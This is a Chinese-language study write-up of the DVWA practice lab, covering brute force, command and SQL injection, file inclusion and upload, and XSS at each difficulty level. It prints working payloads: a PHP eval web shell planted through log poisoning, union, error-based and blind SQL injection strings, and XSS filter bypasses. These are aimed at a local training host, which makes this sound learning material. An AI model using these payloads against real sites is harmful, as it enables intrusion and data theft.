[TOC]



# ==综合靶场漏洞讲解==

## Brute Force

### Low

- 尝试登录

  ![image-20240806174844124](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806174844124.png)

  抓包，发送至intruder模块

  ![image-20240806174928016](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806174928016.png)

  配置参数

  ![image-20240806175008725](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806175008725.png)

  ![image-20240806175020686](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806175020686.png)

  开始攻击，找到对应结果

  ![image-20240806175039205](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806175039205.png)

### Medium

主要问题存在于请求发送时间间隔，不懂啊我靠

### High

涉及到时间和token的知识，这我更不懂为什么了

## Command Injection

![image-20240806182527421](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806182527421.png)

### Low

第一个命令执行结果正确与否无所谓，利用一些符号使得正确执行第二个命令就好了

![image-20240806182036048](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806182036048.png)

### Medium

同样的道理

![image-20240806182613730](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806182613730.png)

### High

这个稍微不一样，因为在源代码处理过程中，对一些特殊符号做了过滤

![image-20240806182748877](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806182748877.png)

所以我们可以使用的他叔符号很有限，而且他这里不知道为什么 ; 是无法使用的

![image-20240806182714622](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806182714622.png)

## File Inclusion

![image-20240806183135754](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240806183135754.png)

### Low,Medium,High

直接先访问 `http://192.168.230.147/DVWA/vulnerabilities/fi/?page=<?@eval($_POST['a']);?>`

然后再访问 `http://192.168.230.147/DVWA/vulnerabilities/fi/?page=/opt/lampp/logs/access_log` 其中POST参数为`a=phpinfo();` 

High关卡由于设置了访问内容范围，所以我们需要使用PHP伪协议来访问本地文件系统 `http://192.168.230.147/DVWA/vulnerabilities/fi/?page=file:///opt/lampp/logs/access_log`

## File Upload

![image-20240806215628134](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20240806215628134.png)

### Low

直接上传 shell.php 即可

### Medium

burp抓包修改文件类型

### High

上传图片马，利用文件包含漏洞 使用 file:// 伪协议，访问本地文件系统，并传入参数 a=phpinfo(); 

但是如果没有文件包含漏洞怎么办？

## SQL Injection

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807114320711.png" alt="image-20240807114320711" style="zoom:150%;" />

### Low

payload如下：

我使用的是报错注入

```sql
1' union select database(),updatexml(1,concat(0x7e,user(),0x7e),1)--+
```

![image-20240807113111523](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807113111523.png)

也可以，使用union查询，payload如下

`1' union select 1,database() --+` 

![image-20240807113716223](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807113716223.png)

### Medium

数字型post注入，payload如下

`1 union select 1,database()`

![image-20240807113524256](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807113524256.png)

### High

union查询就可以，payload如下

`1' union select 1,database()#`

![image-20240807114142653](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807114142653.png)

这个题报错注入是不行的，因为只要有错，后台自定义错误，出现任何错误都是这样

![image-20240807114222632](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807114222632.png)

## SQL Injection (Blind)

![image-20240807114356449](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807114356449.png)

### Low

这是一道布尔盲注题目

通过试探，发现是字符型注入，并且可以投ing过 --+ 注释单引号，注意，这道题中#注释是不可取的

正确情况回显

![image-20240807114717687](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807114717687.png)

错误情况回显

![image-20240807114735624](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807114735624.png)

payload如下

`1' and length(database())=4 --+`

### Medium

id=1 and 1=1正确回显，id=1 and 1=2错误回显，说明是数字型注入

所以payload如下

`1 and length(database())=4`

![image-20240807115106046](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807115106046.png)

### High

通过试探，此乃字符型注入，单引号闭合， --+ 注释不可取，可使用 # 注释，

所以payload如下

`1' and length(database())=4 #`

![image-20240807115427833](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807115427833.png)

如果判断错误则如下

![image-20240807115454095](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807115454095.png)

## XSS（DOM）

![image-20240807115627525](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807115627525.png)

### Low

payload `default=English<script>alert(1)</script>`

![image-20240807115712523](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807115712523.png)

### Medium

`German</option></select><img src='x' onmouseover="alert(1)">`

```html
<option value="German">Spanish</option>

<option value="German"></option></select><img src="x" onerror="alert(1)">Spanish</option>


<option value="German</option></select><img src='x' onmouseover="alert(1)">">Spanish</option>


<option value="German%3C/option%3E%3C/select%3E%3Cimg%20src=%27x%27%20onmouseover=%22alert(1)%22%3E">German</option>
```

此时利用Low级别的payload发现我们写入的值仅存在于value中，并不存在于<option>和<select> 两个标签之中，我们猜测 <img> 这个标签不允许存在于<option> 和 <select> 标签之中，于是我们可以闭合这些标签，我们先尝试闭合 <option>，本来 <script> 标签是可以存在的，但是这一关将 script 标签过滤掉了，于是就无法使用了，我们只能选择其他标签。

![](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807130415336.png)

- 先尝试闭合 <option> 标签

  ![image-20240807135533042](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807135533042.png)

  ok，没效果，说明不是 <option> 标签限制了 img 的存在s

- 尝试闭合 <select> 标签，payload `</select><img src=1 onerror="alert(1)">` 

  ![image-20240807135706806](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807135706806.png)

  有了，说明 <select> 标签中会限制 <img> 标签的出现

### High

查看源代码

```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?> 
```

查看源代码我们可以看到，服务器通过GET接收到的参数必须是四个 case 中的选项，意味着我们就不能随意修改URL地址栏中的请求参数的值了，那怎么实现跨站脚本攻击呢

URL地址中我们可以通过添加锚点（#，也叫做页面定位符）来实现向前端页面传输，但锚点后面的内容并不会传输给后端服务器

payload `English#<script>alert(1)</script>` 然后重新刷新一下页面就好了（或执行一下）

![image-20240807145028661](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145028661.png)

## XSS（Reflected）

![image-20240807145332333](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145332333.png)

### Low

尝试输入admin 发现直接回显到页面上，那么直接输入 payload `<script>alert(1)</script>`

![image-20240807145437885](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145437885.png)

### Medium

尝试Low级别的payload，发现只回显了alert(1)

![image-20240807145554287](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145554287.png)

说明<script>标签被过滤了，那我们换个标签 payload `<img src=1 onerror="alert(1)">` 同样可以使用 `<svg onload=alert(1)>`

![image-20240807145708451](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145708451.png)

### High

`<img src=1 onerror="alert(1)">`

![image-20240807145758926](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145758926.png)

## XSS（Store）

![image-20240807145922225](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807145922225.png)

### Low

尝试输入正确内容，发现页面完全回显，那么直接在内容中上 payload `<script>alert(1)</script>` ，用户名长度有限制

### Medium

代码审计 可以发现 程序只对`$name`做了过滤，`$message`是进行了统一的SQL注入预防和HTML，PHP标签删除以及实体字符转换，而$name有过滤条件，那么我们就可以想办法绕过，而且还没有进行实体字符转换，ok开搞

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?> 
```

- F12修改name输入框长度

  ![image-20240807162923131](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240807162923131.png)

- 输入大小写绕过或者双写绕过

  `<ScRiPt>alert(/xss/)</ScRiPt>` `<scr<script>ipt>alert(/xss/)</script>` 

### High

和 Medium 差不多，只不过这次 $name 采用的过滤方式是黑名单加正则匹配

修改 $name 输入宽度 ，payload：`<img src=1 onerror="alert(/xss/)">` 
